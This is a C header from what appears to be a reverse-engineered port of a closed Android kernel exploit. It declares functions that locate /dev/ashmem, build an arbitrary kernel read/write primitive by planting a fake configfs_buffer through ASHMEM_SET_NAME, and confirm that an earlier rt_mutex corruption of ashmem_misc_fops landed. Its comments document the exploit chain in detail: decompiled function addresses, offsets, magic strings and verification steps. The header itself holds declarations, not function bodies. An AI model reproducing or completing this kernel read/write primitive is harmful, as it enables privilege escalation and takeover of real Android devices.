#ifndef OSS_CLONE_ASHMEM_CONFIGFS_RW_H
#define OSS_CLONE_ASHMEM_CONFIGFS_RW_H

#include <stddef.h>
#include <stdint.h>

/* source: FUN_001057e0 resolves the ashmem node before exploitation. It
 * first tries `/dev/ashmem<boot_id>`, then scans `/dev/ashmem*` for a
 * character device with the canonical node's st_rdev that opens with
 * O_RDWR|O_CLOEXEC. FUN_00105718 stores the first openable path;
 * FUN_00105968 later opens that stored path from FUN_001076c0.
 *
 * FUN_001076c0 opening sequence (raw r2 disasm, since Ghidra's
 * decompile of this function's tiny call-site helpers -- FUN_00107c7c/
 * FUN_00107c8c/FUN_00107c98 -- is broken: "unaff_w19" everywhere, a
 * lost-register artifact of the compiler keeping the /dev/ashmem fd in
 * a callee-saved register across calls instead of re-passing it, which
 * Ghidra's decompiler failed to recover). Confirmed via raw disasm at
 * 0x76c0 (file vaddr = Ghidra addr - 0x100000, per this project's
 * established Ghidra/r2 address-bias convention):
 *   bl sym.imp.puts        ; puts("stage=verifying-kernel-access")
 *   bl FUN_00105968         ; open(resolved_path, O_RDWR|O_CLOEXEC=0x80002)
 *   mov w19, w0             ; fd kept in w19 for the rest of the function
 * Then (from the decompile, corroborated by disasm register order at
 * the first real call site: x1=target_addr, x2=buf, x3=len, fd carried
 * via w19/x0):
 *   ASHMEM_SET_NAME encodes a fake configfs_buffer inside
 *   ashmem_area.name, then pread64/pwrite64 reaches the requested kernel
 *   address through the corrupted configfs iter handlers.
 * Same read/write semantics confirmed a second, independent way: this
 * project's own already-verified src/root.c:root_read_data/
 * root_write_data use the IDENTICAL (fd, target_addr, buf, len)
 * signature for its own (differently-sourced) physical-memory AAR/AAW
 * primitive -- reused here only for the *calling convention*, not the
 * pipe_phys_* backend itself (which is a different, unrelated
 * primitive from an earlier project stage). */

/* Resolves and caches the openable ashmem alias. Call before grooming, as
 * FUN_001044f4 calls FUN_001057e0 before starting the exploit. Returns 1
 * when an openable node was found, 0 otherwise. */
int oss_prepare_kernel_rw_path(void);

/* Opens the resolved ashmem node. Lazily resolves it for standalone test
 * callers that do not run app_main(). Returns -1 on failure. */
int oss_open_kernel_rw(void);

/* Exact FUN_00107138/FUN_00107058 control-buffer encoding plus the final
 * fortified pread/pwrite equivalent. Returns 1 on a full transfer. */
int oss_kernel_read(int fd, uint64_t target_addr, void *buf, size_t len);
int oss_kernel_write(int fd, uint64_t target_addr, const void *buf,
                      size_t len);
uint64_t oss_kernel_read64(int fd, uint64_t target_addr);
int oss_kernel_write64(int fd, uint64_t target_addr, uint64_t value);

/* source: FUN_001076c0's first two checks (puts("stage=verifying-
 * kernel-access") already happened inside oss_open_kernel_rw's
 * caller):
 *   1. read 8 bytes @ ashmem_misc_fops_addr, must equal
 *      page_base|0x1180 (DAT_0010d9d0 in the decompile) -- this is the
 *      exact value groom_and_install_fops_object's fake rt_mutex_waiter
 *      corrupted ashmem_misc_fops's first field to (see
 *      04_fake_kernel_objects.c's pi_parent). A match here proves the earlier
 *      rb_erase/rt_mutex corruption actually landed, not just that
 *      sched_setattr returned 0.
 *   2. write the exact 35-byte magic string
 *      "CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK" (pulled from the closed
 *      binary's own .rodata via `iz` -- not invented) to
 *      page_base|0x2180 (DAT_0010d9b0), read it back, memcmp. Proves
 *      the read/write primitive itself works end-to-end before it is
 *      ever pointed at real, sensitive kernel state.
 * The closed binary chains several more self-test round trips after
 * this (DAT_0010da58/50/60/d708) through the same broken-decompile
 * helpers; not ported (redundant re-tests of the same primitive, not
 * functionally required once these two independent checks pass). */
int oss_verify_kernel_access(int fd, uint64_t ashmem_misc_fops_addr,
                              uint64_t page_base);

/* Same verification with a sticky landing result. The caller initializes it
 * to zero; this function release-stores 1 after any full eight-byte read at
 * the kernel target (which native size-zero ashmem cannot produce), even if
 * the pointer value or a later R/W round trip is wrong. */
int oss_verify_kernel_access_ex(int fd, uint64_t ashmem_misc_fops_addr,
                                uint64_t page_base, int *landed);

#endif
